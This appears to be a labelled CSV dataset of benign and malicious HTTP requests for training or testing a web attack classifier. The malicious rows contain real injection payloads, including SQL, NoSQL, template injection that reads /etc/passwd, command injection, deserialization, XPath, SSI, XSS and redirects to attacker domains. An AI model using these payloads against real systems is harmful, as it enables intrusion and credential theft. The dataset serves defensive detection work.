label,text
benign,"OPTIONS /v2/projects/abc123e45f HTTP/1.1
Host: cloudservice-data.eu
Origin: https://web.library-portal.biz
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close"
malicious,"GET /shop/item/details?search_term=electronics%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: shopfast-delivery.shop
Connection: close
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cookie: SESSIONID=3b9f6b26e0a44dd8abb2cc1a56945cd0; lang=pref_en"
benign,"POST /api/v1/submit-review HTTP/1.1
Host: urban-life-consultancy.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 2916
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: sessionToken=5df789a1b67efa47e2171b8a2c3f9dde5e73d9f6

client_name=Olivia+Martinez&project_key=UPD-2022045&rating=5&review_text=From+the+initial+consultation+through+to+project+completion%2C+Urban+Life+Consultancy+provided+exceptional+service+and+insights.+The+team+demonstrated+deep+knowledge+of+urban+planning+and+sustainability%2C+delivering+recommendations+that+were+both+innovative+and+practical.+Communication+was+clear+and+timely%2C+with+regular+updates+that+kept+us+fully+informed+about+progress+and+any+challenges+encountered.+The+final+report+was+comprehensive+and+well-supported+with+data+and+visualizations%2C+making+it+easy+for+our+board+to+make+decisions.+We+would+definitely+recommend+their+services+to+other+stakeholders+looking+for+expert+urban+planning+guidance.+Thank+you+Urban+Life+Consultancy+for+a+job+well+done."
malicious,"PUT /api/preferences/set_advanced HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 300
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Origin: https://dashboard.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""currency"": ""USD"", ""show_recommended"": true}, ""cart_options"": {""save_for_later"": false, ""max_items"": 100}}}}"
malicious,"GET /dashboard/overview HTTP/1.1
Host: app.customer-portal.cloud
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"POST /app/user/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/app/user/settings
Cookie: session_token=eb874da21ac874a0fbc9275d690e4938
Content-Length: 67

username=testuser&bio=hello%0aid%0als%20-la%20/tmp%0a#vault"
benign,"POST /api/accounts/create HTTP/1.1
Host: financecloud.my-personal-blog-site.info
Authorization: Bearer 83920d01-11ed-4fb7-afc1-b8f170c57afe
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 242
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<Account>
  <OwnerName>Lucas Meyer</OwnerName>
  <AccountType>Checking</AccountType>
  <Currency>USD</Currency>
  <InitialDeposit>1500.00</InitialDeposit>
  <Email>lucas.meyer@financecloud.my-personal-blog-site.info</Email>
</Account>"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_filter=(uid=attacker%00"
benign,"OPTIONS /api/v4/media/assets/info HTTP/1.1
Host: content-delivery.network
Origin: https://creative-studio-platform.net
Access-Control-Request-Method: GET
Access-Control-Request-Headers: Range
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /user/upload HTTP/1.1
Host: med-records-online.healthcare
User-Agent: python-requests/2.28.1
Accept: application/json
Content-Type: multipart/form-data; boundary=----MedBoundary9988
Content-Length: 525
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.fakePayload.fakeSignature
Connection: keep-alive

------MedBoundary9988
Content-Disposition: form-data; name=""document""; filename=""discharge_summary.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"POST /api/v1/session/renew HTTP/1.1
Host: identity-access-control.com
Authorization: Bearer 57x4x2v5x03e0x9f33
Content-Type: application/json
Content-Length: 32
Idempotency-Key: 2e3871a8-4f28-4b8b-9591-13e5ac0550f7
X-Request-ID: 5a62e7cc-7f97-4c8e-9d2d-45ebef9d6ab9
X-Client-Version: 3.6.7
Accept: application/json
User-Agent: python-requests/2.28.1

{""sessionId"":""33fad913b7c4ef66""}"
malicious,"POST /api/v2/data/filter HTTP/1.1
Host: user-content-service.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Origin: https://dashboard.user-content-service.io
Referer: https://dashboard.user-content-service.io/app/query
Connection: keep-alive
Content-Length: 181

{""query"":{""$where"":""this.email === 'admin@secure-user-portal.net' && (this.pwd.slice(0,1) === 'a' || sleep(3000))""},""limit"":10}"
benign,"GET /css/fonts/fontawesome-webfont.woff2 HTTP/1.1
Host: photo-sharing-hub.net
If-None-Match: ""5a1f4e9bcf7a""
Accept: font/woff2,font/woff;q=0.9,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15"
benign,"POST /chat/send-message HTTP/1.1
Host: tech-support-community.dev
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-US
Content-Length: 174
Connection: close

message=I've+found+that+using+eventListeners+instead+of+inline+JS+in+%3Cdiv%3E+elements+helps+prevent+issues.+Example%3A+function+doSomething()%7Balert('Hi')%7D."
benign,"POST /api/v1/photos/upload HTTP/1.1
Host: secure-photocloud.io
User-Agent: curl/7.79.1
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----FormBoundaryn4J5EiXWbSEqKBhv
Content-Length: 507
Cookie: session=7a9c39f0bb9cde12ef65dfa8baab8f2d

------FormBoundaryn4J5EiXWbSEqKBhv
Content-Disposition: form-data; name=""album_id""

travel_2023
------FormBoundaryn4J5EiXWbSEqKBhv
Content-Disposition: form-data; name=""caption""

Afternoon hike scenery
------FormBoundaryn4J5EiXWbSEqKBhv
Content-Disposition: form-data; name=""image_file""; filename=""hike_view.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------FormBoundaryn4J5EiXWbSEqKBhv--"
benign,"GET /user/account/notifications HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.9
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:80.0) Gecko/20100101 Firefox/80.0
X-Requested-With: XMLHttpRequest
Cookie: sessionid=0182ae19a72d33cfa81d835e43af72a1; prefs=lang%3Den"
malicious,"POST /api/v1/file/load HTTP/1.1
Host: user-storage-manager.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 32
Origin: https://user-storage-manager.net
Connection: keep-alive

{""filePath"": ""/var/log/auth.log""}"
malicious,"POST /app/data/search HTTP/1.1
Host: analytics-datapoint.ai
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/javascript
X-Requested-With: FetchAPIClient
Content-Length: 74

query=records%27]%7D);%20db.logs.remove({user:'attacker'});%20//&limit=10"
malicious,"POST /api/config/loadFromXml HTTP/1.1
Host: load-balancer-secure.io
Content-Type: application/xml
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache

<data>
  <serializedObject><![CDATA[AAEAAAD/////AQAAAAdTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAASFV9UeXBlQ29uZnVzZURlbGVnYXRlAAAGY3JlYXRlAAAAAA==System.Diagnostics.Process…Start…System.Configuration.Install.AssemblyInstaller]]></serializedObject>
</data>"
benign,"PUT /api/v4/orders/987654321 HTTP/1.1
Host: express-delivery-service.net
Authorization: Bearer XyZ!@#9876543210abc987
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Content-Length: 138

<?xml version=""1.0""?>
<order>
  <status>shipped</status>
  <tracking_number>1Z999AA10123456784</tracking_number>
  <estimated_delivery>2024-06-15</estimated_delivery>
</order>"
benign,"GET /products/electronics/laptops/ultrabook-x9/details HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sessionId=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.X7JN9smJLiBi4BDQFvO8O8RHz_64YU-gh0TnbiIb0oQ
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36
Connection: keep-alive"
benign,"POST /api/v3/orders HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer Dkj3k19djf83jfKeR94jdpisl
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Content-Length: 217

{""customerId"":""c1847a2b-3f68-4f18-b74b-5127d4569f2a"",""items"":[{""productId"":""TV-98345"",""quantity"":1},{""productId"":""HS-1209"",""quantity"":2}],""shippingAddress"":{""street"":""824 Cedarview Dr"",""city"":""Portland"",""state"":""OR"",""zipCode"":""97205""},""paymentMethod"":""credit_card"",""notes"":""Leave package with front desk.""}"
benign,"GET /docs/manuals/equipment/alpha-model-42.pdf HTTP/1.1
Host: industrial-catalogs.org
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/pdf,application/x-pdf
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://industrial-catalogs.org/docs/manuals/"
benign,"POST /api/session HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Origin: https://community.game-dev-forum.org
X-CSRF-Token: 3b41278f1a5cf89d30498d67eeacba67
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/114.0
Content-Length: 67

{""username"":""gamer_daniel1990"",""password"":""Champion2023!""}"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: portal-user-secure.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://portal-user-secure.net/home"
malicious,"GET /search?q=latest HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/plain, */*
Referer: https://api.cloud-data-services.ai/dash{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat%20/etc/passwd').read() }} #}
Accept-Language: en-US,en;q=0.9"
benign,"GET /news/%D0%BD%D0%BE%D0%B2%D0%BE%D1%81%D1%82%D0%B8 HTTP/1.1
Host: globalview-info.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.7,en;q=0.5
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36
Accept-Encoding: gzip, deflate, br"
benign,"GET /community/game-dev-forum.org/thread/view/4321?highlight=%4a%5b%6C%7d HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://community.game-dev-forum.org/forum/general
Connection: keep-alive"
malicious,"POST /account/profile HTTP/1.1
Host: data-analytics-center.co
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Origin: https://data-analytics-center.co
Content-Length: 66

profile_description=%3C!--#include%20FiLe%3D%22%2Fusr%2Flocal%2Fbin%2Fconfig.cfg%22--%3E"
benign,"PUT /api/v2/user/profile/5874 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer mNZ29vCxRq4TBLfOlK2wdBpXuAeJGHiy
Origin: https://secure-user-portal.net
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
Content-Length: 88
Connection: keep-alive

{""displayName"":""Molly Grant"",""email"":""molly.grant42@secure-user-portal.net"",""newsletterSubscribed"":true}"
benign,"GET /api/v1/projects/list?category=art&id=1024&sort=recent HTTP/1.1
Host: portal-creativespace.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://portal-creativespace.org/dashboard"
benign,"GET /api/v2/products/electronics/laptops?sort=price_desc&available=true HTTP/1.1
Host: shop-smart-devices.biz
Accept: application/json
DNT: 1
Referer: https://shop-smart-devices.biz/products/electronics
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: newsroom.tech-insights.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36
Referer: https://newsroom.tech-insights.info/latest
Cookie: userid=654321; theme=light"
malicious,"GET /search?q=update+logs HTTP/1.1
Host: analytics.smart-dashboard.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
X-Track-ID: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpeDwvc2NyaXB0Pg==""></iframe>"
malicious,"POST /api/v4/search/accounts HTTP/1.1
Host: secure-login-hub.org
User-Agent: Wget/1.21.1 (linux-gnu)
Content-Type: application/json
Accept: */*
Cookie: auth=eyJhbGciOiJIUzI1NiJ9.ghi789rst

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
malicious,"POST /api/v4/authorize HTTP/1.1
Host: global-secure-login.biz
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://global-secure-login.biz/login
Content-Length: 61
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"OPTIONS /service/data/upload HTTP/1.1
Host: files.cloud-storage-pro.ai
Origin: https://analytics-webapp.biz
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: */*
Connection: close"
benign,"POST /wsdl/SessionManagement HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Content-Type: application/soap+xml;charset=UTF-8
X-CSRF-Token: 48e9a87b-6d22-4d49-8cfc-2f1a07b35c49
Content-Length: 365
Accept: application/soap+xml
Connection: keep-alive

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Header/>
  <soap:Body>
    <KeepAliveSession xmlns=""http://secure-user-portal.net/wsdl"">
      <SessionToken>zxy12345-sessiontoken</SessionToken>
    </KeepAliveSession>
  </soap:Body>
</soap:Envelope>"
benign,"GET /products/electronics/tv/details?id=ZX19KL87&review=The%20picture%20quality%20is%20exceptional%20with%20rich%20colors%20and%20deep%20blacks%2C%20sound%20is%20clear%20and%20immersive%20perfect%20for%20movie%20nights%20and%20gaming HTTP/1.1
Host: online-retail-store.biz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: curl/7.88.1
Connection: close"
benign,"GET /user/elonra88 HTTP/1.1
Host: globalgeeksocial.org
Connection: keep-alive
Accept: text/html
Accept-Language: en-US,en;q=0.5
Referer: https://globalgeeksocial.org/friends
Cookie: loginToken=094bc1827f1d3a08ec4e90a5b33279f8; lastVisit=1684819200
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
malicious,"POST /graphql HTTP/1.1
Host: data-analytics-platform.ai
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 146
Connection: keep-alive
Cookie: token=ab9c8d7e6f5a4b3c2d1e0f9a8b7c6d5e

{""query"": ""/users/user[username='admin' and substring(password,1,1)='p']/id""}"
benign,"GET /videos/tutorials/javascript-basics HTTP/1.1
Host: devlearning-hub.org
User-Agent: Mozilla/5.0 (Linux; Android 9; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/log HTTP/1.1
Host: eduplatform.acad-hub.education
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: application/json
Cookie: sessionid=ms9fjh32xq7c5zv9a3bw
Content-Length: 297

{""event"": ""assignment_submission"", ""student"": {""id"": ""stu9982"", ""name"": ""Mark R.""}, ""assignment"": {""id"": ""asg-2024-06-10-03"", ""course"": ""CS101"", ""files"": [{""name"": ""report.docx"", ""sizeKB"": 112}, {""name"": ""code.py"", ""sizeKB"": 8}]}, ""submittedAt"": ""2024-06-10T14:55:30Z""}"
